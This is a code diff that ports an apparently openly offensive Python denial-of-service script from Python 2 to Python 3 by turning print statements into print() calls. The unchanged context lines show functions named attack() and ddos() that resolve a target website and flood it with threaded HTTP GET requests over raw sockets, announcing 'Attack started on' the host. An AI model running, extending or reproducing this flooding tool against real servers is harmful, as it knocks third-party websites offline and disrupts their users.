@@ -23,7 +23,7 @@ def status():
     thread_num_mutex.acquire(True)
 
     thread_num += 1
-    print "\33[94;1mSending packets to target [{}]\33[00m".format(thread_num)
+    print("\33[94;1mSending packets to target [{}]\33[00m".format(thread_num))
 
     thread_num_mutex.release()
 
@@ -46,7 +46,7 @@ def attack():
 
         dos.send("GET /%s HTTP/1.1\nHost: %s \n\n" % (url_path, host))
     except socket.error:
-        print "\33[91;1mNo connection, server may be down \33[00m"
+        print("\33[91;1mNo connection, server may be down \33[00m")
     finally:
         dos.shutdown(socket.SHUT_RDWR)
         dos.close()
@@ -66,10 +66,10 @@ def ddos():
         host = str(host).replace("https://", "").replace("http://", "").replace("www.", "")
         ip = socket.gethostbyname(host)
     except socket.gaierror:
-        print " ERROR\n Make sure you entered a correct website"
+        print(" ERROR\n Make sure you entered a correct website")
         sys.exit(1)
 
-    print "[^] Attack started on " + host + " (" + ip + ") || Port: " + str(port) + " || # Requests: " + str(num_requests)
+    print("[^] Attack started on " + host + " (" + ip + ") || Port: " + str(port) + " || # Requests: " + str(num_requests))
     time.sleep(3)
 
 
